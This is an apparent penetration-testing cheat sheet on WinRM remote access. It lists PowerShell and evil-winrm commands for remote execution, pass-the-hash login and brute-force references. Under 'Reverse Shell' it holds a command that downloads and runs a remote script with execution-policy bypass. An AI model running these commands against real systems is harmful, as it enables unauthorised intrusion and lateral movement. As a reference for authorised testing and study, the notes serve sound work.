---
Ports: 5985, 5986
Description: Is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
---

>[!info]
> If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!). 

>[!warning]
>User have to be a member of `Remote Management Users`

# Windows

## Activate and test WinRM

```powershell
Enable-PSRemoting -Force  
Set-Item wsman:\localhost\client\trustedhosts *  

# Activate WinRM remotely
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"

# Test WinRM
Test-WSMan -computername [computer]
```

## Execute commands

```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} \[-credential DOMAIN\\username\]
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"] 

# Scripts
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]

# Reverse Shell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}

# Get a PS Session
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
```

---

# Linux

## Exploitation

### Brute Force

- [CrackMapExec](../Tools/CrackMapExec.md#Brute-Force)

### Credentials Required

- [CrackMapExec (Execute Commands)](../Tools/CrackMapExec.md#Execute%20Commands)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)

```bash
# Creds
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>

# PtH
evil-winrm -u <username> -H <Hash> -i <IP>

# Private / Public Key (.pfx/.crt/.key)
evil-winrm -c cert.crt -k priv.key -i 10.10.11.152 -u -p password -S
```